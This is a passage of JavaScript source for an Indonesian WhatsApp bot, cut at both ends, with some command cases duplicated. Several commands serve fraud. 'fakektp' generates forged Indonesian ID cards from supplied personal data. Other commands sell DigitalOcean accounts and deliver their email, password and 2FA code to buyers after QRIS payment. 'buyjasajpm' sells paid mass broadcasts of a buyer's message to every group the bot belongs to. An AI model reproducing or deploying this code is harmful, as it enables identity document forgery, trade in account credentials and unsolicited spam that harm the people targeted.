   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Digitalocean ${Obj.akun.droplet} Droplet
`}, {quoted: db.users[m.sender].saweria.msg})
var teks = `*Data Akun Digitalocean 📦*

*💌 Email :* ${Obj.akun.email}
*🔐 Password :* ${Obj.akun.password}
*Kode 2FA :* ${Obj.akun.kode2fa}
*Droplet :* ${Obj.akun.droplet}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Seller hanya mengirim 1 kali!
* Garansi akun aktif 30 day
`
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: m})
const position = stokdo.indexOf(Obj.akun)
stokdo.splice(position, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break
case 'tosketch': {
  const styleList = {
    "2": "Anime Sketch",
    "3": "Line Art",
    "4": "Simplex",
    "5": "Doodle",
    "6": "Intricate Line",
    "8": "Sketch",
    "10": "Pencil Sketch",
    "11": "Ink Sketch",
    "12": "Manga Sketch",
    "13": "Gouache",
    "14": "Color Rough",
    "15": "BG Line",
    "16": "Ink Painting"
  };
  if (!text) {
    let list = Object.entries(styleList).map(([k, v]) => `${k}. ${v}`).join('\n');
    return m.reply(`*List Style tosketch*\n\n${list}\n\nContoh penggunaan:\nReply gambar dengan\n*tosketch 2*`);
  }
  let qmsg = m.quoted || m;
  let mime = (qmsg.msg || qmsg).mimetype || '';
  if (!mime.startsWith('image/')) return m.reply('Reply gambar yang ingin diubah ke sketsa!\nFormat: *tosketch <nomor>*\nContoh: tosketch 2');
  if (!styleList[text.trim()]) {
    return m.reply('Style tidak ditemukan! Ketik *tosketch* untuk melihat daftar style.');
  }
  m.reply('Sebentar, sedang diproses jadi sketsa...');

  try {
    const { ImageUploadService } = require('node-upload-images');
    let media = await conn.downloadAndSaveMediaMessage(qmsg);
    const service = new ImageUploadService('pixhost.to');
    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'sketchyubi.jpg');
    let img = directLink.toString();
    let api = `https://fastrestapis.fasturl.cloud/imgedit/tosketch?imageUrl=${encodeURIComponent(img)}&style=${text.trim()}`;
    conn.sendMessage(m.chat, { image: { url: api }, caption: `Sukses!\nStyle: ${styleList[text.trim()]}` }, { quoted: m });
  } catch (e) {
    console.error(e);
    m.reply('Gagal memproses gambar. Pastikan gambarnya valid dan coba lagi.');
  }
}
  break
case "addstok": case "adddo": case "addstokdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("xyra@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
if (!text.split("|")) return m.reply(example("xyra@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
const cek = text.split("|")
if (cek.length < 5) return m.reply(example("xyra@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
let [email, pw, kode2fa, reff, droplet, harga] = text.split("|")
stokdo.push({
email: email, 
password: pw, 
kode2fa: kode2fa, 
referall: reff, 
droplet: droplet, 
harga: Number(harga)
})
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menambah data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delstok": case "delstokdo": case "deldo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
if (text == "all") {
await stokdo.splice(0, stokdo.length)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
return m.reply(`Berhasil menghapus semua stok data akun digitalocean ✅`)
}
if (!text || isNaN(text)) return m.reply(example("idnya\n\nKetik *.liststok* untuk lihat id"))
if (Number(text) > stokdo.length) return m.reply("Id stok tidak ditemukan")
let inx = Number(text) - 1
stokdo.splice(inx, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menghapus data stok digitalocean ✅")
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'kurs': {
 const url = 'https://api.exchangerate-api.com/v4/latest/MYR';
 try {
 const res = await fetch(url);
 if (!res.ok) throw new Error('Gagal mengambil data kurs.');

 const data = await res.json();
 const rate = data.rates.IDR;
 const now = new Date();
 const options = { timeZone: 'Asia/Jakarta', hour12: false };
 const date = now.toLocaleDateString('id-ID', options);
 const time = now.toLocaleTimeString('id-ID', options);
 const formatNumber = (num) => num.toLocaleString('id-ID', { minimumFractionDigits: 3, maximumFractionDigits: 3 });

 const result = `📌 *Kurs Mata Uang MYR / Ringgit Malaysia*\n\n`
 + `💱 🇲🇾RM1 =\n 🇮🇩 Rp *${formatNumber(rate)}* \n\n`
 + `📅 *Update Kurs:* ${date}\n`
 + `🕰 *Waktu Jakarta (WIB):* ${time}`;

 await conn.sendMessage(m.chat, { text: result }, { quoted: m });
 } catch (e) {
 await conn.sendMessage(m.chat, { text: '❌ Gagal mengambil data kurs!' }, { quoted: m });
 }
}
 break
 
 case 'geminiadvanced': case 'geminii': {
  if (!m.quoted) return m.reply('Harap balas ke foto yang ingin dianalisis + pertanyaan,gk ad pertanyaan gpp');
  let mime = (m.quoted.msg || m.quoted).mimetype || "";
  if (!mime.startsWith('image/')) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`);
  const axios = require('axios');
  const FormData = require('form-data');
  const { writeFileSync, unlinkSync, createReadStream } = require('fs');
  const path = require('path');
  async function uguu(filePath) {
    try {
      const form = new FormData();
      form.append('files[]', createReadStream(filePath));
      const { data } = await axios.post('https://uguu.se/upload', form, {
        headers: { ...form.getHeaders() }
      });
      return data.files[0].url;
    } catch (err) {
      throw new Error(err.message);
    }
  }
  try {
    await conn.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } });
    let mediaBuffer = await m.quoted.download();
    let ext = mime.split('/')[1] || "png";
    let tempFile = path.join(__dirname, `temp_${Date.now()}.${ext}`);
    writeFileSync(tempFile, mediaBuffer);
    let imageUrl = await uguu(tempFile);
    let pertanyaan = m.text.replace(`${prefix}${command}`, '').trim();
    if (!pertanyaan) return m.reply('Tolong masukkan pertanyaan');
    let sessionId = `${m.chat.replace(/[^a-zA-Z0-9]/g, '')}-${Date.now()}`;
    let apiUrl = `https://api.hiuraa.my.id/ai/gemini-advanced?text=${encodeURIComponent(pertanyaan)}&_mediaUrl=${encodeURIComponent(imageUrl)}&sessionid=${sessionId}`;
    let { data } = await axios.get(apiUrl);
    let result = data.result;
    await conn.sendMessage(m.chat, { text: result }, { quoted: m });
    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    unlinkSync(tempFile);
  } catch (error) {
    console.error('Error in geminiadvanced:', error);
    m.reply('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.');
  }
}
break
case 'venice': case 'veniceai': {
if (!text) return m.reply('Contoh: .venice apa itu AI?');
conn.sendMessage(m.chat, { react: { text: '💗', key: m.key }});
try {
const axios = require('axios');
const { data } = await axios.request({
method: 'POST',
url: 'https://outerface.venice.ai/api/inference/chat',
headers: {
accept: '*/*',
'content-type': 'application/json',
origin: 'https://venice.ai',
referer: 'https://venice.ai/',
'user-agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
'x-venice-version': 'interface@20250523.214528+393d253'
},
data: JSON.stringify({
requestId: 'nekorinn',
modelId: 'dolphin-3.0-mistral-24b',
prompt: [
{
content: text,
role: 'user'
}
],
systemPrompt: '',
conversationType: 'text',
temperature: 0.8,
webEnabled: true,
topP: 0.9,
isCharacter: false,
clientProcessingTime: 15
})
});
const chunks = data.split('\n').filter(v => v).map(v => JSON.parse(v));
const hasil = chunks.map(v => v.content).join('');
conn.sendMessage(m.chat, { text: hasil }, { quoted: m });
} catch (e) {
console.error(e.message);
conn.sendMessage(m.chat, { text: 'Maaf, tidak ada hasil dari Venice.' }, { quoted: m });
}
}
break

 case 'smeme': {
 if (!m.quoted) return m.reply(`Balas gambar dengan perintah:\n${prefix + command} <teks atas>|<teks bawah>`);
 const { Sticker } = require('wa-sticker-formatter');
 async function uguu(filePath) {
 try {
 const form = new FormData();
 form.append('files[]', fs.createReadStream(filePath));
const axios = require('axios');
 const { data } = await axios.post('https://uguu.se/upload', form, {
 headers: { ...form.getHeaders() }
 });
 return data.files[0].url;
 } catch (err) {
 throw new Error(err.message);
 }
 }
 async function createSticker(img, url) {
 let stickerMetadata = {
 type: "full",
 pack: "My Sticker",
 author: "© BiyuOffc",
 quality: 100
 };
 return (new Sticker(img || url, stickerMetadata)).toBuffer();
 }
 let [atas, bawah] = text.split('|');
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || "";
 if (!mime.startsWith('image/')) return m.reply("❌ Hanya bisa digunakan untuk gambar!");
 await conn.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } });
 let mediaBuffer = await q.download();
 let ext = mime.split('/')[1] || "png";
 let tempFile = path.join(__dirname, `temp_${Date.now()}.${ext}`);
 fs.writeFileSync(tempFile, mediaBuffer);
 try {
 let url = await uguu(tempFile);
 let memeUrl = `https://api.memegen.link/images/custom/${encodeURIComponent(atas || " ")}`
 + `/${encodeURIComponent(bawah || " ")}.png?background=${url}`;
 let stickerBuffer = await createSticker(memeUrl, false);
 await conn.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });
 await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat meme.");
 } finally {
 fs.unlinkSync(tempFile);
 }
}
break
case "faketweet": {
  try {
    if (!/image/.test(mime)) return m.reply('Balas gambar yang ingin dijadikan foto profil tweet.');
    if (!text) return m.reply(`*Cara Pakai:*
Balas gambar lalu kirim perintah seperti ini:

${prefix + command} teksTweet/Nama/Username/Waktu/Tanggal/Retweet/Quote/Like/Mode

*Contoh:*
${prefix + command} Yang Baca Tolol/kenn/kennBot083/9:36 PM/May 2,2025/155/678/872/dark

*Mode tersedia:* light, dark, dim (huruf kecil semua)`);
    m.reply("Sedang diproses kak :v\n\n> kennzy");
    let [
      content,
      name,
      username,
      time,
      date,
      retweets,
      quotes,
      likes,
      mode
    ] = text.split('/');
    const media = await conn.downloadAndSaveMediaMessage(m.quoted);
    const { ImageUploadService } = require('node-upload-images');
    const fs = require("fs");
    const axios = require('axios');
    const service = new ImageUploadService("pixhost.to");
    const { directLink } = await service.uploadFromBinary(fs.readFileSync(media), "biyu.jpg");
    const response = await axios.get(`https://fastrestapis.fasturl.cloud/maker/tweet?content=${encodeURIComponent(content)}&ppUrl=${directLink}&name=${encodeURIComponent(name)}&username=${encodeURIComponent(username)}&verified=true&time=${encodeURIComponent(time)}&date=${encodeURIComponent(date)}&retweets=${retweets}&quotes=${quotes}&likes=${likes}&mode=${mode}`, { responseType: "arraybuffer" });
    conn.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: mess.done
    }, { quoted: m });
  } catch (e) {
    console.log(e);
    m.reply('Terjadi kesalahan saat membuat fake tweet.');
  }
}
break
case "fakektp": {
  try {
    if (!/image/.test(mime)) return m.reply('Kirim Gambar yang akan dijadikan KTP dengan caption perintah!');
    if (!text) return m.reply(`Contoh:\n${prefix + command} JawaBarat/Bandung/3275024509970001/Budi Santoso/Bandung, 25-09-1997/Laki-Laki/A/JL. SUDIRMAN NO. 123/05|08/RAWA BOBO/PASAR MINGGU/ISLAM/BELUM MENIKAH/PEGAWAI SWASTA/WNI/7 Minggu/26-09-1997/25-09-2023`);
    m.reply("Proses Cikk 🥸\n\n> kennzy");
    const { ImageUploadService } = require('node-upload-images');
    const fs = require('fs');
    var [ 
      provinsi,
      kota,
      nik,
      nama,
      ttl,
      jenisKelamin,
      golonganDarah,
      alamat,
      rtrw,
      kelDesa,
      kecamatan,
      agama,
      status,
      pekerjaan,
      kewarganegaraan,
      masaBerlaku,
      terbuat
    ] = text.split('/');
    let media = await conn.downloadAndSaveMediaMessage(m.quoted);
    const service = new ImageUploadService('pixhost.to');
    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'biyu.jpg');
    const resUrl = `https://fastrestapis.fasturl.cloud/maker/ktp?provinsi=${provinsi}&kota=${kota}&nik=${nik}&nama=${nama}&ttl=${ttl}&jenisKelamin=${jenisKelamin}&golonganDarah=${golonganDarah}&alamat=${alamat}&rtRw=${rtrw}&kelDesa=${kelDesa}&kecamatan=${kecamatan}&agama=${agama}&status=${status}&pekerjaan=${pekerjaan}&kewarganegaraan=${kewarganegaraan}&masaBerlaku=${masaBerlaku}&terbuat=${terbuat}&pasPhoto=${encodeURIComponent(directLink)}`;
    const axios = require('axios');
    const response = await axios.get(resUrl, { responseType: "arraybuffer" });
    conn.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: mess.done
    }, { quoted: m });
  } catch (e) {
    console.log(e);
    m.reply('Terjadi kesalahan, pastikan format input sudah benar.');
  }
}
break

case "liststok": case "liststokdo": case "listdo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
//if (m.isGroup) return Reply(mess.private)
let messageText = "\n *── List stok akun digital ocean*\n"
let count = 0
for (let res of stokdo) {
messageText += `\n*ID Stok :* ${count += 1}
*Email :* ${res.email}
*Password :* ${res.password}
*Kode 2FA :* ${res.kode2fa}
*Referall :* ${res.referall}
*Harga :* Rp${await toIDR(res.harga.toString())}
*Droplet :* ${res.droplet}\n`
}
return m.reply(messageText)
}
break
case 'meownimejadwal': {
  try {
    const axios = require('axios');
    const cheerio = require('cheerio');
    const { data } = await axios.get('https://meownime.ltd/jadwal/');
    const $ = cheerio.load(data);
    const hariList = ['Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu', 'Minggu', 'Random'];
    let hasil = '*📅 Jadwal Rilis Anime - Meownime*\n\n';
    for (const hari of hariList) {
      hasil += `*${hari}:*\n`;
      let kosong = true;
      $(`#${hari}`).find('.penzbar').each((i, el) => {
        const title = $(el).find('.nyaalist').text().trim();
        const link = $(el).find('.nyaalist').attr('href');
        if (title && link) {
          kosong = false;
          hasil += `• ${title}\n  ↳ ${link}\n`;
        }
      });
      if (kosong) hasil += `• (Tidak ada data)\n`;
      hasil += '\n';
    }
    m.reply(hasil.trim());
  } catch (err) {
    console.error("Error meownimejadwal:", err);
    m.reply("Gagal mengambil jadwal rilis anime dari Meownime.");
  }
}
break
case 'addsewa': {
  if (!m.isGroup) return m.reply('Hanya bisa digunakan di grup');
  if (!isCreator) return m.reply('Hanya owner yang bisa menambahkan sewa');
  const waktu = argsbiyuoffc[0];
  if (!waktu) return m.reply('Format: addsewa 1jam / 30menit / 10detik');
  const jumlah = parseInt(waktu);
  if (isNaN(jumlah)) return m.reply('Angka tidak valid');
  let ms = 0;
  if (waktu.includes('jam')) ms = jumlah * 60 * 60 * 1000;
  else if (waktu.includes('menit')) ms = jumlah * 60 * 1000;
  else if (waktu.includes('detik')) ms = jumlah * 1000;
  else return m.reply('Gunakan format waktu: jam/menit/detik');
  const data = loadSewa();
  const target = m.chat;
  const now = Date.now();
  const ada = data.find(d => d.jid === target);
  if (ada) {
    ada.expired += ms;
    ada.warningSent = false;
  } else {
    data.push({ jid: target, expired: now + ms, warningSent: false });
  }
  saveSewa(data);
  m.reply(`Sewa untuk grup ini ditambahkan selama ${waktu}`);
}
break
case 'listsewa': {
  if (!isCreator) return m.reply('Khusus owner!');
  const data = loadSewa();
  if (data.length === 0) return m.reply('Tidak ada data sewa.');
  let teks = '*Daftar Sewa Aktif:*\n\n';
  data.forEach((d, i) => {
    const sisa = d.expired - Date.now();
    const menit = Math.floor(sisa / 60000);
    teks += `${i + 1}. ${d.jid}\n   Sisa: ${menit} menit\n`;
  });
  m.reply(teks);
}
break
case 'undsewa': {
  if (!isCreator) return m.reply('Hanya owner yang bisa hapus sewa');
  const jid = argsbiyuoffc[0];
  if (!jid) return m.reply('Format: undsewa [jid grup]');
  let data = loadSewa();
  const awal = data.length;
  data = data.filter(d => d.jid !== jid);
  if (data.length === awal) return m.reply('ID tidak ditemukan di sewa.json');
  saveSewa(data);
  m.reply(`Berhasil menghapus sewa untuk ${jid}`);
}
break
case 'addakses': {
  if (!isCreator) return m.reply('Khusus owner!');
  if (!m.isGroup) return m.reply('Ketik perintah ini di grup yang ingin diberi akses.');
  if (aksesGrup.groups.includes(m.chat)) return m.reply('Grup ini sudah punya akses.');
  aksesGrup.groups.push(m.chat);
  saveAksesGrup();
  m.reply('Grup ini sekarang punya akses ke fitur-fitur bot.');
}
break
case 'undakses': {
  if (!isCreator) return m.reply('Khusus owner!');
  if (!m.isGroup) return m.reply('Ketik perintah ini di grup yang ingin dicabut aksesnya.');
  if (!aksesGrup.groups.includes(m.chat)) return m.reply('Grup ini belum punya akses.');
  aksesGrup.groups = aksesGrup.groups.filter(g => g !== m.chat);
  saveAksesGrup();
  m.reply('Akses grup ini telah dicabut.');
}
break
case 'topcmd': {
  let logs = JSON.parse(fs.readFileSync(logPath))
  let todayStart = moment().startOf('day').valueOf()
  let todayLogs = logs.filter(log => log.time >= todayStart)
  let freq = {}
  for (let log of todayLogs) {
    freq[log.cmd] = (freq[log.cmd] || 0) + 1
  }
  let sorted = Object.entries(freq).sort((a, b) => b[1] - a[1])
  if (!sorted.length) return m.reply('Belum ada command yang digunakan hari ini.')
  let teks = '*Top 10 Command Hari Ini:*\n\n'
  sorted.slice(0, 10).forEach(([cmd, total], i) => {
    teks += `${i + 1}. *${cmd}* → ${total}x\n`
  })
  m.reply(teks)
}
break
case "buyjasajpm": case "jasajpm": {
if (m.isGroup) return m.reply("Pembelian jasa jpm hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
const tgc = await conn.groupFetchAllParticipating()
let totalgrup = await Object.keys(tgc)
if (!text) return m.reply(example(`teksnya bisa dengan kirim foto juga\n\n*Total Grup :* ${totalgrup.length} Grup chat\n*Harga :* Rp10.000`))
let Obj = {}
Obj.harga = "10000"
Obj.pesan = text
if (/image/.test(mime)) Obj.img = qmsg
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Jasa Jpm Pesan
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Jasa Jpm Pesan
`}, {quoted: db.users[m.sender].saweria.msg})

let rest
if (Obj.img !== undefined) {
rest = await conn.downloadAndSaveMediaMessage(Obj.img)
}
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = Obj.pesan
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${res.length} grup chat`}, {quoted: m})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break
case 'reminder': {
    if (!text.includes('|')) return m.reply(`Contoh:\nreminder makan|2m`);
    const [reason, durationRaw] = text.split('|');
    const duration = parseDuration(durationRaw.trim());
    if (!duration) return m.reply(`Format durasi salah. Contoh: 2m, 10s, 1h`);
    setReminder({
      sender: m.sender,
      reason: reason.trim(),
      duration,
      name: m.pushName,
      reply: (msg, opt) => conn.sendMessage(m.chat, { text: msg, ...opt }, { quoted: m })
    });
  }
  break
  case 'register':
case 'daftar': {
  if (userData[m.sender]) return m.reply('❌ Kamu sudah terdaftar sebelumnya!');
  if (!q.includes('|')) return m.reply('Format salah!\n\nContoh: *register Kenn|20*');
  let [nama, umur] = q.split('|');
  nama = nama.trim();
  umur = umur.trim();
  if (!nama || !umur) return m.reply('Format belum lengkap!\nContoh: *register Kenn|20*');
  if (isNaN(umur)) return m.reply('Umur harus berupa angka!');
  if (umur < 5 || umur > 100) return m.reply('Umur tidak valid. Harus 5-100 tahun.');
  userData[m.sender] = {
    nama,
    umur: Number(umur),
    registeredAt: new Date().toISOString()
  };
  fs.writeFileSync(userFile, JSON.stringify(userData, null, 2));
  const moment = require('moment-timezone');
  const fetch = require('node-fetch');
  const jam = moment().tz('Asia/Jakarta').format('HH:mm:ss');
  const hari = moment().tz('Asia/Jakarta').format('dddd, DD MMMM YYYY');
  const nomor = m.sender.split('@')[0];
  let ppUrl = await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://files.catbox.moe/zxnzgb.jpeg');
  let ppuser = await (await fetch(ppUrl)).buffer();
  const textChannel = `┏━〔 *NOTIFIKASI REGISTER* 〕━┓
┃
┃ ➤ *Nama* : ${nama}
┃ ➤ *Umur* : ${umur} tahun
┃ ➤ *No HP* : wa.me/${nomor}
┃ ➤ *Tanggal* : ${hari}
┃ ➤ *Waktu* : ${jam} WIB
┃
┗━━━━━━━━━━━━━━━━━━━━━`;
  const ctxInfo = {
    mentionedJid: [m.sender],
    forwardingScore: 9999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: idch,
      serverMessageId: 20,
      newsletterName: 'Kennzy'
    },
    externalAdReply: {
      title: `⭐ Pendaftaran Baru!`,
      body: `• ${hari} - ${jam} WIB\n• Otomatis terdaftar di sistem`,
      thumbnail: ppuser, 
      mediaType: 1,
      renderLargerThumbnail: false,
      sourceUrl: 'https://kennzy.vercel.app/'
    }
  };
  await conn.sendMessage(idch, {
    text: textChannel,
    contextInfo: ctxInfo
  });
  m.reply(`✅ *Pendaftaran berhasil!*\n\n• Nama: ${nama}\n• Umur: ${umur} tahun\n• Tanggal: ${hari}\n• Jam: ${jam} WIB`);
}
break
case 'topcmd': {
  let logs = JSON.parse(fs.readFileSync(logPath))
  let todayStart = moment().startOf('day').valueOf()
  let todayLogs = logs.filter(log => log.time >= todayStart)
  let freq = {}
  for (let log of todayLogs) {
    freq[log.cmd] = (freq[log.cmd] || 0) + 1
  }
  let sorted = Object.entries(freq).sort((a, b) => b[1] - a[1])
  if (!sorted.length) return m.reply('Belum ada command yang digunakan hari ini.')
  let teks = '*Top 10 Command Hari Ini:*\n\n'
  sorted.slice(0, 10).forEach(([cmd, total], i) => {
    teks += `${i + 1}. *${cmd}* → ${total}x\n`
  })
  m.reply(teks)
}
break
case "buyjasajpm": case "jasajpm": {
if (m.isGroup) return m.reply("Pembelian jasa jpm hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
const tgc = await conn.groupFetchAllParticipating()
let totalgrup = await Object.keys(tgc)
if (!text) return m.reply(example(`teksnya bisa dengan kirim foto juga\n\n*Total Grup :* ${totalgrup.length} Grup chat\n*Harga :* Rp10.000`))
let Obj = {}
Obj.harga = "10000"
Obj.pesan = text
if (/image/.test(mime)) Obj.img = qmsg
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Jasa Jpm Pesan
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
